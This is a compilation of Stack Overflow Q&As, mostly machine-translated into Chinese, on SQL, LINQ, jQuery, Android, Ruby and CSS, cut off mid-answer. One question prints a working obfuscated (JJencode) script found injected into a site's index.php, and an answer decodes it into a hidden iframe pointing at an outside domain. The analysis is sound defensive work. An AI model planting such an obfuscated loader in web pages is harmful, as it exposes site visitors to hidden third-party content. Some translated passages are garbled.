无论开始和结束时间的日历日期如何，如何根据现在在警报的开始时间和结束时间之间找到所有当前处于活动状态的警报？我目前没有考虑时区，但将来会考虑。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-14T10:21:32.823

这个问题代表了使用 sqlite 时 ActiveRecord 中的一个错误。解决这个问题的方法是切换到mysql。更多信息在这里：[https ://github.com/rails/rails/issues/6247#issuecomment-5679856](https://github.com/rails/rails/issues/6247#issuecomment-5679856)

# c# - 使用 Linq2SQL 中的时间戳列获取增量

> ID：10514820
> 
> 赞同：1
> 
> 时间：2012-05-09T11:05:31.977
> 
> 标签：c#, sql, linq-to-sql

我需要对表执行增量选择（仅返回自某个 TimeStamp 以来已更改的记录），并且我必须使用 TimeStamp 列。在 SQL 中，这很容易：

```
@DeltaStamp TIMESTAMP

...

select *
from table
where timestamp > @DeltaStamp 
```

在 Linq2SQL 中，我可以轻松获得最大时间戳：

```
var maxStamp = MyTable
.OrderByDescending(x => x.TimeStamp)
.Take(1)
.FirstOrDefault().TimeStamp; 
```

但是如何执行增量查询？

```
var newRecords = MyTable
.Where(x => x.TimeStamp > maxStamp); 
```

这不编译：

```
Operator '>' cannot be applied to operands of type 
'System.Data.Linq.Binary' and 'System.Data.Linq.Binary' 
```

干杯。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T11:09:54.710

这在 L2S 中是不可能的。SQL Timestamp 列不是 dateTime 列。它是二进制文件，L2S 将其视为二进制文件。因此，你无法做你想做的事，至少不能“开箱即用”。您可以按如下方式创建自己的比较器：

```
public static class BinaryComparer
{
 public static int Compare(this Binary v1, Binary v2)
 {
 throw new NotImplementedException();
 }
}

var result = from row in MyTable
             where BinaryComparer.Compare(row.TimeStamp, SomeTarget) > 0
             select row; 
```

这应该有效，或者接近。

# sql - 从表中选择重复行和不同行中的状态行

> ID：10514824
> 
> 赞同：2
> 
> 时间：2012-05-09T11:05:38.967
> 
> 标签：sql, sql-server

我需要一些关于 SQL Server 的帮助

我有许多表格行，如下所示。

```
ID   Name          status  
1    viral/AHD     Yes  
2    viral/AHD     No  
3    joe/US        Yes  
4    thomas/IND    Yes   
5    jack/IND      No 
```

现在我想选择那些在`Name`列中不同的行，即第 3、第 4、第 5 行以及那些在列中重复`Name`但`status`为`Yes`..

所以我的最终答案是这样的：

```
ID   Name          Status  
1    viral/AHD     Yes  
3    joe/US        Yes  
4    thomas/IND    Yes  
5    jack/IND      No 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:10:20.073

如果您使用的是 sql 2005+。那么这可能会有所帮助：

```
;WITH CTE
AS
(
    SELECT
        ROW_NUMBER() OVER(PARTITION BY Name 
                     ORDER BY 
                    (CASE WHEN status='Yes' THEN 0 ELSE 1 END)) AS RowNbr,
        Table1.*
    FROM
        Table1
)
SELECT
    *
FROM
    CTE
WHERE
    CTE.RowNbr=1 
```

**编辑**

或者更简单。像这样：

```
;WITH CTE
AS
(
    SELECT
        ROW_NUMBER() OVER(PARTITION BY Name 
                    ORDER BY status DESC) AS RowNbr,
        Table1.*
    FROM
        Table1
)
SELECT
    *
FROM
    CTE
WHERE
    CTE.RowNbr=1 
```

有用的参考资料：

*   [OVER 子句 (Transact-SQL)](http://msdn.microsoft.com/en-us/library/ms189461.aspx)
*   [WITH common_table_expression (Transact-SQL)](http://msdn.microsoft.com/en-us/library/ms175972.aspx)

# javascript - 页面中出现奇怪的 javascript

> ID：10514831
> 
> 赞同：2
> 
> 时间：2012-05-09T11:05:48.623
> 
> 标签：javascript

该脚本出现在我帮助的网站的 index.php 页面中：

```
<script type="text/javascript">$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$$_$+$._$+$.$$__+$._+"\"+$.__$+$.$_$+$.$_$+$.$$$_+"\"+$.__$+$.$_$+$.$$_+$.__+".\"+$.__$+$.$$_+$.$$$+"\"+$.__$+$.$$_+$._$_+"\"+$.__$+$.$_$+$.__$+$.__+$.$$$_+"('<"+$.$$_$+"\"+$.__$+$.$_$+$.__$+"\"+$.__$+$.$$_+$.$$_+"\"+$.$__+$.___+"\"+$.__$+$.$$_+$._$$+$.__+"\"+$.__$+$.$$$+$.__$+(![]+"")[$._$_]+$.$$$_+"=\\"\"+$.__$+$.$$_+$.$$_+"\"+$.__$+$.$_$+$.__$+"\"+$.__$+$.$$_+$._$$+"\"+$.__$+$.$_$+$.__$+$.$_$$+"\"+$.__$+$.$_$+$.__$+(![]+"")[$._$_]+"\"+$.__$+$.$_$+$.__$+$.__+"\"+$.__$+$.$$$+$.__$+":\"+$.$__+$.___+"\"+$.__$+$.$_$+$.___+"\"+$.__$+$.$_$+$.__$+$.$$_$+$.$$_$+$.$$$_+"\"+$.__$+$.$_$+$.$$_+";\\"><\"+$.__$+$.$_$+$.__$+$.$$$$+"\"+$.__$+$.$$_+$._$_+$.$_$_+"\"+$.__$+$.$_$+$.$_$+$.$$$_+"\"+$.$__+$.___+"\"+$.__$+$.$$_+$._$$+"\"+$.__$+$.$$_+$._$_+$.$$__+"=\\"\"+$.__$+$.$_$+$.___+$.__+$.__+"\"+$.__$+$.$$_+$.___+"://"+$.$$$$+"\"+$.__$+$.$$_+$._$_+".\"+$.__$+$.$__+$.$$$+$.$$$_+$._$+"\"+$.__$+$.$$_+$._$_+"\"+$.__$+$.$__+$.$$$+$.$$$_+"\"+$.__$+$.$_$+$._$$+$._$+"\"+$.__$+$.$_$+$.___+"\"+$.__$+$.$_$+$.$$_+$.$$_$+$.$$_$+"\"+$.__$+$.$$_+$._$$+"."+$.$$__+$._$+"\"+$.__$+$.$_$+$.$_$+"/"+$.$$_$+"\"+$.__$+$.$_$+$.__$+"\"+$.__$+$.$$_+$._$_+$.$$$_+$.$$__+$.__+".\"+$.__$+$.$$_+$.___+"\"+$.__$+$.$_$+$.___+"\"+$.__$+$.$$_+$.___+"?\"+$.__$+$.$$_+$.___+$.$_$_+"\"+$.__$+$.$__+$.$$$+$.$$$_+"="+$.$__+$._$$+$.$$$$+$.$$_$+$.$$_$+$.$__$+$.$__+$.$$__+$.__$+$.$$_+$.$$$_+$._$_+$.$$_+$.$__+$.$$$+$.$$_$+"\\"\"+$.$__+$.___+"\"+$.__$+$.$$_+$.$$$+"\"+$.__$+$.$_$+$.__$+$.$$_$+$.__+"\"+$.__$+$.$_$+$.___+"=\\""+$.$__+$.$$_+$.$___+"\\"\"+$.$__+$.___+"\"+$.__$+$.$_$+$.___+$.$$$_+"\"+$.__$+$.$_$+$.__$+"\"+$.__$+$.$__+$.$$$+"\"+$.__$+$.$_$+$.___+$.__+"=\\""+$.$$_+$.___+"\\"\"+$.$__+$.___+$.$_$_+(![]+"")[$._$_]+"\"+$.__$+$.$_$+$.__$+"\"+$.__$+$.$__+$.$$$+"\"+$.__$+$.$_$+$.$$_+"=\\""+(![]+"")[$._$_]+$.$$$_+$.$$$$+$.__+"\\">\"+$.__$+$.___+$._$$+$._$+$._+"\"+$.__$+$.$_$+$.$$_+$.__+$.$$$_+"\"+$.__$+$.$$_+$._$_+"</\"+$.__$+$.$_$+$.__$+$.$$$$+"\"+$.__$+$.$$_+$._$_+$.$_$_+"\"+$.__$+$.$_$+$.$_$+$.$$$_+"></"+$.$$_$+"\"+$.__$+$.$_$+$.__$+"\"+$.__$+$.$$_+$.$$_+">');"+"\"")())();
</script> 
```

它似乎做的唯一一件事就是在您尝试打开页面时返回错误。我刚刚删除了它，一切又正常了，但我们不知道它是如何到达那里的，也不知道它是否应该做一些可能有害的事情。该网站托管在 aruba 上，并且可以访问代码的两个人最近都没有在此页面上工作过。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T16:48:05.417

所以现在这是一个谜。

漂亮地打印代码，它有 4 个阶段：

1.  申报 $
2.  使用 $ 的当前值构造一个字典，然后再次将其分配给 $
3.  使用字典中的其他值在字典中设置几个额外的键/值对
4.  构造一个立即调用的嵌套函数调用对

$ 声明，就像这里的所有东西一样，有点奇怪：

```
$=~[]; 
```

在 Chrome 控制台中，这将返回 -1；在数值上下文中计算，[] 变为 0，而 ~（javascript 中的按位 NOT 运算符）在 0 上产生 -1。所以我们有一个分配给-1的变量。毫不含糊！

```
v = -1; 
```

然后构造一个字典，没有混淆：

```
$={ ___ : ++$,              dct={ zero  : 0,
  $$$$  : (![] + "")[$],          f     : "f",
  __$   : ++$,                    one   : 1,
  $_$_  : (![] + "")[$],          a     : "a",
  _$_   : ++$,                    two   : 2,
  $_$$  : ({} + "")[$],           b     : "b",
  $$_$  : ($[$] + "")[$],         d     : "d",
  _$$   : ++$,                    three : 3,
  $$$_  : (!"" + "")[$],          e     : "e",
  $__   : ++$,                    four  : 4,
  $_$   : ++$,                    five  : 5,
  $$__  : ({} + "")[$],           c     : "c",
  $$_   : ++$,                    six   : 6,
  $$$   : ++$,                    seven : 7,
  $___  : ++$,                    eight : 8,
  $__$  : ++$                     nine  : 9
  };                            }; 
```

所以我们有一个字典，其中包含一些从 0 到 9 的值，以及字母 a 到 f。有人闻到十六进制吗？获取字母的方法是从可预测的js生成的字符串中挑选出子字符串；对于“a”、“e”和“f”，假值加上“”给出“假”。`{}+""`对 b 和 c给出`[object Object]`, 并`undefined`得出 d.

接下来，它将字典 ( ) 的 $_（我们称之为 alpha）元素构造为`$.$_`一系列字符串的串联（到目前为止定义的 unobf 名称，plus`_$`变为 beta、`$$`gamma、`__`delta、 `$`epsilon、`_`phi）：

```
(dct.alpha = dct + "")[dct.five]    // dct.alpha = "[object Object]", yields "c"
(dct.beta  = dct.alpha[dct.one])    // dct.beta="o", yields "o"
(dct.gamma = (dct.epsilon + "")[dct.one]) // dct.gamma="n", "n"
((!dct) + "")[dct.three]            // "s"
(dct.delta = dct.alpha[dct.six])    // dct.delta="t", "t"
(dct.epsilon= (!"" + "")[dct.one])  // dct.epsilon="r", "r"
(dct.phi   = (!"" + "")[dct.two])   // dct.phi = "u", "u"
dct.alpha[dct.5]                    // "c"
dct.delta                           // "t"
dct.beta                            // "o"
dct.epsilon                         // "r" 
```

所以所有这些都将 dct.alpha ( `$.$_`) 设置为“构造函数”。不祥的。类似的设置`$.$$`（我们称之为 gamma），将其设置为“return”。云变厚了。

另一个重新分配，这次是`$.$`（我们的 dct.epsilon），将其设置为

```
dct.epsilon = (dct.zero)[dct.alpha][dct.alpha] 
```

这不仅仅是一个数组查找。`dct.zero`为 0，所以 (0)["constructor"] 正在查找 0 的 "constructor" 属性。请记住，在 javascript 中 a["b"] 与 ab 相同，`(0)["constructor"]["constructor"]`因此`0.constructor.constructor`. 0的构造函数是Number函数，Number函数的构造函数是Function函数。然后将此函数（指针）分配给 dct.epsilon。虫子变了。

最后一条语句是一个嵌套函数调用`$.$$`：

```
dct.epsilon(                  Function(
  dct.epsilon(                  Function(
    //long concatenation            // something functiony
  )()                           )()
)();                          )() 
```

长连接将传递给函数构造函数，然后立即执行。从这个函数返回的函数也将被立即执行。

实际上，到目前为止，我们所看到的一切都是脚手架。几乎任何函数都可以用这种方式构造，尽管我们对将使用的字母有所了解。我会冒昧地猜测上面是一个通用的混淆，可以容纳任何所需的有效负载。

逐个字符构造的字符串是：

```
return "docu\155e\156t.\167\162\151te('<d \151 ... // continues 
```

所以我们可以看到那里有转义序列。事实上，返回告诉我们整个文档... 字符串将被帮助取消转义，然后批发返回，为外部调用做好准备。

所以外部调用将收到这个现在未转义的字符串（格式化和拆分字符串以提高可读性）：

document.write('' + ''+ '计数器'+ ''+ '' );

我在哪里放了 'HEXYHEXY' 而不是那里的十六进制字符串 - 它可能会将您的网站或病毒作者链接到此页面，我们并不真正想要。iframe src 中的域可能与病毒作者有关，或者它可能只是另一个被入侵的页面；蠕虫可能会使用一个主机通过这种病毒作为中介来引导另一个主机。我的猜测是它只会驱动虚假页面印象 - 每次点击您的页面时，目标页面也是如此，但由于隐藏的 div 容器，没有人看到广告等。“计数器”位只是试图将秘密隐藏在众目睽睽之下。如果您查看浏览器对页面的表示，您所看到的只是一个看似无辜的 Counter iframe。

# 一些需要避免的 JavaScript 技巧

病毒作者在这里有一些技巧可以避免找到此类脚本的简单方法：

1.  使用 ASCII 转义，例如`\155`变成 'm'，所以字母永远不会是纯字符串。
2.  将字符串传递给 Function 函数以构造任意函数，而不是使用`eval`
3.  使用可预测的自动生成字符串的子字符串`(![]+"")[3] = "false"[3] = "s"`来挑选单个字符，而不将它们放入纯字符串中
4.  无休止地使用和重用带有名称`$`和`_`名称的变量来迷惑人类读者
5.  在字典声明中使用变量使得在不执行代码的情况下很难看到静态值。
6.  任务返回；`(a=b)`返回 a 的值，因此`(a=b)`[3] 在赋值的值上返回一个子字符串，同时也进行赋值
7.  在较大的分配中一次性重新分配变量，例如`a = {(a=3):"b",++a:"c"}`

所有这些在普通代码中都是一个非常糟糕的主意，因为它们在这里的原因是：它们使代码难以阅读或理解。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T11:07:33.687

很可能是病毒。这些类型的病毒通过感染主机（几乎总是 Windows），然后将自身复制到他们可以找到的任何 HTML 文件中。然后，当您打开与服务器的连接时，“受感染”的 HTML 文件会被复制过来，最终，您最终会无意中感染或对访问者造成伤害。

使您的防病毒软件保持最新。

# javascript - jQuery .slide 和 .slideUp。没开

> ID：10514833
> 
> 赞同：0
> 
> 时间：2012-05-09T11:05:51.503
> 
> 标签：javascript, jquery, css, slide

我已经制作了这个脚本：

```
$("#comments .comment .links").hide();
$("#comments .comment").hover(
    function() { $(".links", this).stop(true).slideDown(300); },
    function() { $(".links", this).stop(true).slideUp(300); }
); 
```

现在我有一个问题。当我将鼠标悬停在评论 div 上时。我徘徊了几次。.links div 不再显示。div 未完全打开。

我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:23:15.287

试试这个

```
$("#comments .comment .links").hide();
$("#comments .comment").hover(
    function() { $(".links", this).not(":animated").slideDown(300); },
    function() { $(".links", this).not(":animated").slideUp(300); }
); 
```

或者

```
$("#comments .comment .links").hide();
$("#comments .comment").hover(
    function() { 
                  $(".links", this).stop(true, true).slideToggle();
               }
); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T12:32:36.600

稍加修改，你就有了。

```
$("#comments .comment .links").hide();
$("#comments .comment").hover(
    function() { $(".links", this).stop(true, true).slideDown(300); },
    function() { $(".links", this).stop(true, true).slideUp(300); }
);​ 
```

# asp.net - 在 ASP.NET 的 ContentPlaceHolder 中并排放置 Div，列高相等

> ID：10514842
> 
> 赞同：2
> 
> 时间：2012-05-09T11:06:31.197
> 
> 标签：asp.net, css, html, vertical-alignment

我试图有三列。左右列包含一个按钮，这些按钮应与容器的外边框保持固定对齐。中心列包含一个`asp:Table`动态创建的，包含从 1 行 1 列到 6 行 7 列的所有内容。

我试图遵循这个最终成为这个网站的[CSS 示例：](http://www.alistapart.com/articles/holygrail) [http](http://www.alistapart.com/d/holygrail/example_3.html) ://www.alistapart.com/d/holygrail/example_3.html ，我已经让`div`s 并排 - 但我可以' t 让左右列垂直对齐或与中心 div 标签具有相等的高度，我猜这是同一件事。

我不知道这是否重要，但我的 div`ContentPlaceHolder`在 ASP`Page`中。

**这是我的代码：**

```
<asp:Content ID="BodyContent" runat="server" ContentPlaceHolderID="MainContent">
    //Container to the three columns
    <div id="calendarContainer"> 

        //The left button container
        <div id="navigateButtonLeft" class="calendarColumn">
            <asp:Button ID="btnLeftMonth" runat="server" Text="<" 
                        onclick="btnLeftMonth_Click" /> 
        </div>

        //The table/month-calendar container
        <div id="calendar"class="calendarColumn">
            <asp:Table ID="TableMonthCalendar" runat="server" GridLines="Both" />
        </div>

        //The right button container
        <div class="calendarColumn">
            <asp:Button ID="btnRightMonth" runat="server" Text=">" 
                        onclick="btnRightMonth_Click" />  
        </div>
    </div>
</asp:Content> 
```

**和我的 CSS（可能毫无价值）：**

```
#calendarContainer {
  overflow:hidden;
  border: 1px solid black;
}
#calendarContainer .calendarColumn {
  padding-bottom: 1001em;
  margin-bottom: -1000em;
  border: 1px solid black;
  overflow:hidden;
  float:left;
}
#navigateButtonLeft {

}
#calendar {
  width: 80%;
}
#navigateButtonRight {

} 
```

我以前使用 a`table`和 a`tr`和三个`td`s，但我无法让它成为我想要的方式。

这是我想要实现的目标的说明，这可能比我的解释更好： ![设计目标](../Images/c44c3d708aaa368a46c032f421403bc3.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T11:34:54.887

您需要格式化日历并将具有绝对位置的列放置在您假装的位置，并避免在添加其他内容时进一步中断布局：

请看这个[小提琴的例子！](http://jsfiddle.net/zuul/vHjwr/)

阅读有关此类解决方案的更多信息：

[CSS 位置属性](http://www.w3schools.com/cssref/pr_class_position.asp) | [CSS-Tricks - 流体宽度等高列](http://css-tricks.com/fluid-width-equal-height-columns/)

**笔记：**

在[Fiddle](http://jsfiddle.net/zuul/vHjwr/)上，检查**css**部分以了解**如何将元素定位**到适当的位置。此外，使用 top 和 bottom 允许元素从其包装器的顶部到底部，在您的情况下，包装器是`#calendarContainer`.

* * *

**编辑：**

带有没有“坐标”的主包装器的第二个[小提琴示例。](http://jsfiddle.net/zuul/vHjwr/3/)

* * *

**再次编辑**

另一个使用样式为常规图标的按钮的[Fiddle 示例。](http://jsfiddle.net/zuul/vHjwr/4/)

*使用的图标：*

[向左箭头](http://www.iconfinder.com/icondetails/42167/16/br_prev_icon)| [向右箭头](http://www.iconfinder.com/icondetails/42166/16/br_next_icon)

* * *

**编辑以添加来自 OP 的最后一个请求，按钮从上到下**

小提琴[在这里！](http://jsfiddle.net/zuul/vHjwr/5/)

# android - 从中选择值时如何删除进度对话框？

> ID：10514845
> 
> 赞同：0
> 
> 时间：2012-05-09T11:06:43.367
> 
> 标签：android, dialog

```
final CharSequence[] items = {"Red", "Green", "Blue"}

AlertDialog.Builder builder = new AlertDialog.Builder(this);

builder.setTitle("Pick a color");

builder.setSingleChoiceItems(items, -1, new DialogInterface.OnClickListener() {

    public void onClick(DialogInterface dialog, int item) {

        Toast.makeText(getApplicationContext(), items[item], Toast.LENGTH_SHORT).show();
    }
});

AlertDialog alert = builder.create(); 
```

当我从（红色，绿色，蓝色）中选择一个值时，它应该删除它的方式。请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:10:01.657

```
builder.setSingleChoiceItems(items, -1, new DialogInterface.OnClickListener() {

    public void onClick(DialogInterface dialog, int item) {  
    //Here you gets dialog as argument

        dialog.dismiss(); <---------
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:10:15.127

试试这个，

```
final CharSequence[] items = {"Red", "Green", "Blue"}   
final AlertDialog alert = null;
AlertDialog.Builder builder = new AlertDialog.Builder(this);  
builder.setTitle("Pick a color");    
builder.setSingleChoiceItems(items, -1, new DialogInterface.OnClickListener() {  
    public void onClick(DialogInterface dialog, int item) {

        Toast.makeText(getApplicationContext(), items[item], Toast.LENGTH_SHORT).show();
     alert.dismiss();
    }
}); 
 alert = builder.create();
 alert.show(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T11:29:58.143

使用下面的代码它将起作用。

```
public class TestingActivity extends Activity {

    AlertDialog alert;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        final CharSequence[] items = { "Red", "Green", "Blue" };

        final AlertDialog.Builder builder = new AlertDialog.Builder(this);

        builder.setTitle("Pick a color");

        builder.setSingleChoiceItems(items, -1, new DialogInterface.OnClickListener() {

            public void onClick(DialogInterface dialog, int item) {

                Toast.makeText(getApplicationContext(), items[item], Toast.LENGTH_SHORT).show();
                        dismiss();
            }

        });
        alert = builder.create();

        alert.show();
    }

    private void dismiss() {
        alert.dismiss();

    }
    } 
```

# ruby - 用于创建表示树中节点的对象的惯用 Ruby，该对象知道其父节点

> ID：10514847
> 
> 赞同：0
> 
> 时间：2012-05-09T11:06:46.453
> 
> 标签：ruby, api-design, idioms

我正在为一个 REST API 开发一个 Ruby 绑定，并且正在为它的一部分而被认为是惯用的 Ruby 苦苦挣扎。

用一个简化的例子来说明，API 所代表的资源形成了一个树形结构：

```
 root
            /\
           /  \
          /    \
      group   group    
        /       /\
       /       /  \
      /       /    \
project  project  project 
```

要创建子的新实例，需要了解其父实例。例如，要创建一个新组，它必须知道根，以便它可以检索用于从根创建组的 URI。

我对读取访问感到相当满意：

```
api = Api.new(...)
api.groups # An array of all groups
api.groups.select(...).projects # An array of all a group's projects 
```

它正在创造我不确定的新资源。

我考虑过在数组子类上有一个 create 方法：

```
group = api.groups.create("group-name")
project = group.projects.create("project-name") 
```

直接实例化类型，将父级作为构造函数参数：

```
group = Group.new(api, "project-name")
project = Project.new(group, "project-name") 
```

在父对象上创建方法：

```
group = api.create_group("group-name")
project = group.create_project("project-name") 
```

在上面的三种方法中，我更喜欢第一种，因为它简洁并且允许链接创建。第三个选项类似，但感觉不对 - 就 REST API 而言，创建发生在错误的级别，因为它是允许创建组的组资源。也就是说，我不是一个经验丰富的 Ruby 开发人员，首先，我希望 Ruby API 对 Ruby 开发人员来说是惯用的，即使这意味着它与 REST API 的模型不完全匹配。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T13:56:15.040

我不清楚提供的代码示例和描述如何与 REST 关联，但我会根据我的理解提供两分钱：

我认为将这三者结合使用是完全有效的。至于什么是惯用的，我会从[Rails 关联方法](http://guides.rubyonrails.org/association_basics.html#detailed-association-reference)中获得提示。

`api.groups.create`遵循 Rails 的`has_many`语法。`api.create_group`并`group.create_project`遵循`has_one`语法。而且我假设，在`create`/的语法糖之下`create_association`，您正在使用组合来将所有类的引用联系在一起，因此`Group.new(api, "group-name")`/`Project.new(group, "project-name")`似乎也是完全有效的选项。没有规则说您不能使用所有三种方法来获得良好的效果（Rails 确实如此）。

我建议避免子类化 Ruby 的基类（你提到子类化 Array），除非你有充分的理由这样做。只需在必要时使用组合来委托给他们。

# android - 使用 App Engine Python 的 C2DM 返回 401 错误

> ID：10514851
> 
> 赞同：2
> 
> 时间：2012-05-09T11:07:19.327
> 
> 标签：android, python, google-app-engine, android-c2dm

我很想向我的手机发送消息。通过浏览器我调用了执行此操作的方法，我已经记录了registrationId、authToken等。这是正确的，因为我在本地服务器中进行了测试，并且消息已使用这些键发送到我的手机。

**但是在 App Engine 上，`urlfetch.fetch`for ' `https://android.clients.google.com/c2dm/send`'**的结果出现 401 错误。

或者，如果这是身份验证问题。我怀疑是上面的问题，因为调用了该方法，并且错误发生在我的 App Engine 服务器中方法的末尾。

以下是我向 C2DM 服务器发出请求的方式：

```
params = {
          'registration_id':registrationId,
          'collapse_key':0,
          'data.payload':encoded_msg
         }

        paramsByte = urllib.urlencode(params)
        logging.info(registrationId)

        url = 'https://android.clients.google.com/c2dm/send'
        logging.info(token)
        result = urlfetch.fetch(url=url,
                                payload=paramsByte,
                                method=urlfetch.POST,
                                headers={'Content-Type':'application/x-www-form-urlencoded',
                                         'Authorization':'GoogleLogin auth='+token}
                                ) 
```

任何帮助，将不胜感激。谢谢。

* * *

**更新**

> 现在客户端按照建议在托管服务器中运行，并且在联系“https://android.clients.google.com/c2dm/send”时发生 401 错误。

但是，当在具有相同令牌和 regId 的终端上使用以下命令时，它可以工作。

> curl --header "授权：GoogleLogin auth=your_authenticationid" "https://android.apis.google.com/c2dm/send" -d registration_id=your_registration -d "data.payload=payload" -d collapse_key=0

**客户端代码调用服务器中的方法：**

```
$.getJSON('http://myapp.appspot.com/method?userId='+userId+'&message='+theMessage+'&callback=?', 
    function(data)
    {
        console.log(data);
    }); 
```

**服务器的完整方法代码：**

```
class PushHandler(webapp.RequestHandler):

    '''This method sends the message to C2DM server to send the message to the phone'''
    def get(self):
        logging.info('aqui dentro')
        userId = self.request.get('userId')
        message = self.request.get('message')
        callback = self.request.get('callback')
        token = getToken(self) #this is a method I've implemented to get the token from C2DM servers by passing the SenderId and Password
        registrationId = ''
        contactNumber = ''

        # Get the registrationId to send to the C2DM server to know which 
        # device it may send the message
        regQuery = C2DMUser.all()
        regQuery.filter('userId =', int(userId))
        for k in regQuery:
            registrationId = k.registrationId

        # Builds the json to be sent to the phone
        record_to_json = {
                          'userId':userId,
                          'message':message
                          }
        data = []
        data.append(record_to_json)
        jsondata = simplejson.dumps(data) # Creates the json

        # Encode the JSON String
        u = unicode(jsondata, "utf-8")
        encoded_msg = u.encode("utf-8")

        params = {
                  'registration_id':registrationId,
                  'collapse_key':0,
                  'data.payload':encoded_msg
                  }

        paramsByte = urllib.urlencode(params)

        url = 'https://android.clients.google.com/c2dm/send'
        logging.info(token)
        result = urlfetch.fetch(url=url,
                                payload=paramsByte,
                                method=urlfetch.POST,
                                headers={'Content-Type':'application/x-www-form-urlencoded',
                                         'Authorization':'GoogleLogin auth='+token}
                                )

        data = []
        params_key = { 'status_code':result.status_code }
        data.append(params_key)
        self.response.headers['Content-Type'] = 'application/json'
        jsondata = simplejson.dumps(data)

        if result.status_code == 200:
            logging.info(result.status_code)
            self.response.out.write('' + callback + '(' + jsondata + ')') # handle the JSONP
        else:
            logging.info(result.status_code)
            self.response.out.write(result.status_code) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:47:30.223

您的代码包名称必须与您在注册​​ c2dm 帐户时提供的名称一致。对于 Java，如果您在注册时提供了 com.myapp，则您的 c2dm 调用必须发生在该包中。不过，不确定这如何转化为 Python。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T12:04:03.947

就 C2DM 部分而言，一切似乎都还好。如果您说使用相同的凭据可以与您的本地服务器一起使用，我猜它应该可以在 App Engine 上使用。

就 XMLHttpRequest 错误而言，您不能通过 XMLHttpRequest 向其他域或子域发出请求。因此，您不能从 localhost 向`yourSite`. 一个解决方案是使用[JSONP](http://en.wikipedia.org/wiki/JSONP)。

# android - Strange Focus Issues on specific Android Honeycomb tablet (Orange Tahiti)

> ID：10514854
> 
> 赞同：1
> 
> 时间：2012-05-09T11:07:37.837
> 
> 标签：android, focus, android-3.0-honeycomb

I have a form-based app where each form is a scrollable layout of various types of view (`RadioButton`, `Spinner`, `EditText` views, etc). I have tested the app on a Galaxy Nexus with Android 4 and an Advent Vega with Android 4 and there are no issues with focus. I can scroll through the form without any problems.

However, when I test on the target device (a Android 3.2 Orange Tahiti which is a rebranded Huawei MediaPad), suddenly the focus behaviour is very different. It's difficult to know exactly what the tablet is trying to do. If I hide the soft keyboard and scroll, the tablet tries to focus on EditText views as they come into view and pops up the keyboard every time it successfully focuses which is very annoying. Also, on occasion the tablet will randomly jump to the last `EditText` in the form, scrolling the user away from their position in the form.

I have tried various focus settings (`requestFocus`, `clearFocus()`, `descendantFocusability`, etc) to no avail. However, I doubt the problem has anything to do with config as it works fine on other devices.

Is it possible that the focus behaviour in Honeycomb is different to all other versions of Android? I doubt it but it's worth finding out for sure before resorting to installing a custom ROM just in case I have overlooked a Honeycomb-specific config setting that might fix the problem.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-11T09:14:35.400

似乎这是橙色大溪地随附的 Honeycomb 品牌版本的一个问题（或包含的“功能”）。

升级到 ICS 将对其进行整理和滚动等操作将如您所愿。请按照以下链接获取说明...

[http://forum.xda-developers.com/showthread.php?t=1544855](http://forum.xda-developers.com/showthread.php?t=1544855)

# iphone - Maximum allowed cache in iPad

> ID：10514855
> 
> 赞同：1
> 
> 时间：2012-05-09T11:07:40.903
> 
> 标签：iphone, ios, ipad, html, safari

I am working on a web-application which has **multiple videos sizing upto 22MBs**. The requirement is to cache these videos or store it in local-storage so as to avoid buffering of the videos every-time the end-user hits the website on iPad.

Is it valid to do such thing ? I need a suggestion to check if this practice is good to use such large amount of memory for video caching in iPad ?

(The application is majorly accessed through the safari on iPad or iOS)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:42:34.110

我不确定视频的最佳实践，因为我没有对视频做太多事情，但是如果您正在寻找有关可以保存多少数据以及如何保存的信息，请查看[http://milesmatthias.com/post/ 21323839252/the-current-state-of-client-side-storage](http://milesmatthias.com/post/21323839252/the-current-state-of-client-side-storage)总结了不同的策略及其大小限制。

# ruby - Ruby copy an array of arrays

> ID：10514857
> 
> 赞同：8
> 
> 时间：2012-05-09T11:07:43.787
> 
> 标签：ruby, arrays, reference

Is there a way in Ruby to make a copy of multi-dimensional array? I mean some built-in function.

When I try to use .dup it just returns reference:

```
irb(main):001:0> a = [[1,2,3], [4,5,6]]
=> [[1, 2, 3], [4, 5, 6]]
irb(main):002:0> b = a.dup
=> [[1, 2, 3], [4, 5, 6]]
irb(main):003:0> b[0][0] = 15
=> 15
irb(main):004:0> a == b
=> true 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-09T11:48:12.113

您需要复制列表中的数组，而不仅仅是外部数组。最简单的方法可能是

```
b = a.map(&:dup) 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-05-09T11:14:18.127

编组应该可以解决问题：

```
